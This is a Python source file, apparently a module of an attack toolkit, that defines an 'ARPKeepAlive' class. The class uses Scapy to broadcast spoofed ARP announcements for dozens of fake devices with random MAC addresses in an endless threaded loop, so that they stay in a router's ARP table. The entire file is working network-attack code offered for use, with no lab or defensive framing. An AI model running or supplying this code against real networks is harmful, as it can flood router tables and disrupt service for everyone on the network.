import random
import time
import threading
from scapy.all import Ether, ARP, sendp
from .base_attack import BaseAttack

class ARPKeepAlive(BaseAttack):
    """Maintain fake devices in router's ARP table"""
    
    def __init__(self, interface: str, base_ip: str, num_devices: int = 50):
        """
        Initialize ARP keep-alive attack
        
        :param base_ip: Base IP address (e.g., "192.168.1.")
        :param num_devices: Number of devices to maintain
        """
        super().__init__(interface)
        self.base_ip = base_ip
        self.num_devices = num_devices
        self._validate_ip()

    def _validate_ip(self):
        """Validate base IP format"""
        if not self.base_ip.endswith(".") or len(self.base_ip.split(".")) != 4:
            raise ValueError("Invalid base IP format. Use format like '192.168.1.'")

    def _generate_arp_packet(self, ip_suffix: int):
        """Create ARP announcement packet"""
        ip = f"{self.base_ip}{ip_suffix}"
        mac = "02:00:00:%02x:%02x:%02x" % (
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255)
        )
        return Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
               ARP(op=1, psrc=ip, hwsrc=mac, pdst=ip)

    def _send_arp_announcements(self):
        """Continuous ARP sending loop"""
        while self.running:
            try:
                for i in range(1, self.num_devices + 1):
                    if not self.running:
                        break
                    pkt = self._generate_arp_packet(i)
                    sendp(pkt, iface=self.interface, verbose=False)
                    self.logger.info(f"ARP announced {pkt.psrc} at {pkt.hwsrc}")
                    time.sleep(0.1)
                time.sleep(5)
            except Exception as e:
                self.logger.error(f"ARP send error: {str(e)}")
                self.stop()

    def start(self):
        """Start ARP maintenance"""
        if not self.running:
            self.running = True
            self.thread = threading.Thread(target=self._send_arp_announcements)
            self.thread.start()
            self.logger.info(f"Started ARP keep-alive for {self.num_devices} devices")

    def stop(self):
        """Stop ARP maintenance"""
        self.running = False
        if self.thread and self.thread.is_alive():
            self.thread.join()
        self.logger.info("ARP keep-alive stopped")